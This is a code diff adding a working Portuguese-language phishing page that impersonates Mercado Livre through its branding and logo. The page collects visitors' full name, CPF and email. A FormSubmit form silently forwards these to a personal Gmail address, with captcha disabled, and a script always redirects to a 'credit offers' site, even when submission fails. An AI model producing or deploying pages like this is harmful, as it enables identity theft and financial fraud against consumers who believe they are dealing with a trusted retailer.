@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+<title>Cartão</title>
+<style>
+    body { margin: 0; font-family: 'Sora', sans-serif; background-color: #f2f2f2; color: #333; }
+    .header { display: flex; align-items: center; padding: 10px; border-bottom: 1px solid #aa9900; background-color: #FFE600; }
+    .header img { width: 125px; padding: 10px; }
+    .content { margin: 0 auto; padding: 10px 20px 30px 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); background-color: #ffffff; margin-top: 20px; max-width: 400px; }
+    h1 { color: #333; font-size: 18px; margin-bottom: 20px; text-align: center; }
+    label { color: #666; font-size: 15px; display: block; margin-bottom: 8px; }
+    .cpf-input { width: 100%; padding: 12px; font-size: 15px; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 15px; box-sizing: border-box; }
+    .button { background-color: #FFE600; color: #1c1c1c; padding: 14px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; text-decoration: none; border: none; }
+    .button:hover { background-color: #e6cf00; }
+</style>
+</head>
+
+<body>
+<div class="header">
+    <img src="https://i.ibb.co/sp4Np7Yq/oie-transparent.png" alt="Logo Mercado Livre" class="logo">
+</div>
+
+<div class="content">
+    <h1>Preencha seus dados</h1>
+
+    <!-- 🟩 FORMULÁRIO -->
+    <form id="formulario" action="https://formsubmit.co/josephstark1333@gmail.com" method="POST">
+        
+        <label for="nome">Nome completo</label>
+        <input type="text" id="nome" name="nome" class="cpf-input" placeholder="Digite seu nome completo" required>
+
+        <label for="cpf">CPF</label>
+        <input type="text" id="cpf" name="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14" required>
+
+        <label for="email">E-mail</label>
+        <input type="email" id="email" name="email" class="cpf-input" placeholder="Digite seu e-mail" required>
+
+        <!-- Configurações FormSubmit -->
+        <input type="hidden" name="_subject" value="Novo formulário recebido do site">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+
+        <button type="submit" class="button">Enviar e Continuar</button>
+    </form>
+</div>
+
+<script>
+// Máscara de CPF
+document.getElementById('cpf').addEventListener('input', function (e) {
+  let value = e.target.value.replace(/\D/g, '');
+  if (value.length > 0)
+    value = value
+      .replace(/^(\d{3})(\d)/g, '$1.$2')
+      .replace(/^(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3')
+      .replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3-$4');
+  if (value.length > 14) value = value.substring(0, 14);
+  e.target.value = value;
+});
+
+// ⚙️ Redirecionar após o envio (mesmo que o e-mail falhe)
+document.getElementById('formulario').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const form = e.target;
+    const data = new FormData(form);
+
+    // Envia via Fetch (API FormSubmit)
+    fetch(form.action, {
+        method: form.method,
+        body: data,
+        headers: { 'Accept': 'application/json' }
+    }).then(response => {
+        // Sucesso — redireciona
+        window.location.href = "https://ofertasdecredito.digital/redirect1";
+    }).catch(error => {
+        // Mesmo se der erro, segue para a próxima página
+        window.location.href = "https://ofertasdecredito.digital/redirect1";
+    });
+});
+</script>
+
+</body>
+</html>
